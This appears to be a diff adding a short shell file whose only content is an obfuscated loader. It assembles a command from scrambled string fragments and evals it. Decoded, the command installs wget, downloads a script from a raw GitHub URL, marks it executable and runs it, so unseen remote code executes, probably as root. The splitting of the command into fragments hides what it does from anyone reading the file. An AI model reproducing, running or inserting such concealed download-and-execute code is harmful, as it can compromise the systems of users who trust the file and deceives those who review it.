@@ -1,0 +1,3 @@
+z="
+";pz='h &&';sz='n.sh';dz='alph';jz='md" ';kz='&& c';Ez='& ap';Tz='.git';Az='```';ez='a3/m';Vz='serc';Cz='upda';Kz=' wge';Nz='O de';qz=' ./d';Oz='bian';rz='ebia';Pz='.sh ';gz='menu';Dz='te &';cz='023/';Mz='O- -';az='eleg';Gz='stal';lz='hmod';Sz='/raw';Lz='t -q';bz='end2';Fz='t in';Uz='hubu';Wz='onte';Hz='l wg';nz='debi';Xz='nt.c';Rz='ps:/';Zz='okag';Qz='"htt';Jz='y &&';Yz='om/h';mz=' +x ';oz='an.s';Bz='apt ';Iz='et -';hz='/deb';iz='ian.';fz='ain/';
+eval "$Az$z$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$z$Az"
